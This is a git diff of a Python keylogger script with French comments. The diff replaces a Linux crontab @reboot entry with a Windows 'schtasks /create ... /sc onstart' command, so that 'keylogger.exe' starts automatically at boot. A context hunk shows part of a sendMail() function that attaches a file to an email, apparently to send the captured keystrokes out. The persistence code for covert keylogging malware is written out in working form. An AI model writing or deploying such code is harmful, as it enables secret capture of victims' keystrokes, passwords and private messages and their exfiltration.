@@ -12,29 +12,18 @@ import os
 
 #--------DÉBUT TÂCHES PROGRAMMÉES---------------
 
-#On donne les droits d'exécutions
-os.system('chmod +x keylogger.py')
+def tacheProgramme(tache,chemin):
+    command = f'schtasks /create /tn "{tache}" /tr "{chemin}" /sc onstart /f'
 
+    os.system(command)
+    print(f"Tâche '{tache}' programmée pour s'exécuter au démarrage du système.")
 
-# Chemin vers le script Python
-python_script = os.getcwd()+'/keylogger.py'
+tache = "Keylogger"
+chemin = os.getcwd()
+chemin +="/keylogger.exe"
 
-path_env = os.getcwd()+'/env/bin/python'
+tacheProgramme(tache,chemin)
 
-# Commande crontab pour exécuter le script Python au démarrage avec temporisation et affichage graphique
-cron_job = f"@reboot sleep 30 && DISPLAY=:0 {path_env} {python_script} >> /home/ubuntu/cronlog.txt 2>&1"
-
-# Obtenir la crontab actuelle de l'utilisateur
-current_cron = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
-
-# Vérifier si le script est déjà dans la crontab
-if cron_job not in current_cron.stdout:
-    # Ajouter la nouvelle tâche à crontab
-    new_cron = current_cron.stdout + cron_job + "\n"
-    subprocess.run(['crontab', '-'], input=new_cron, text=True)
-    print("Le script Python a été ajouté à crontab pour être exécuté au démarrage.")
-else:
-    print("Le script Python est déjà dans crontab.")
 
 #--------FIN TÂCHES PROGRAMMÉES----------------
 
@@ -72,6 +61,7 @@ def sendMail():
         f"attachment; filename= {filename}",
     )
     message.attach(part)
+
 
     context = ssl.create_default_context()
 
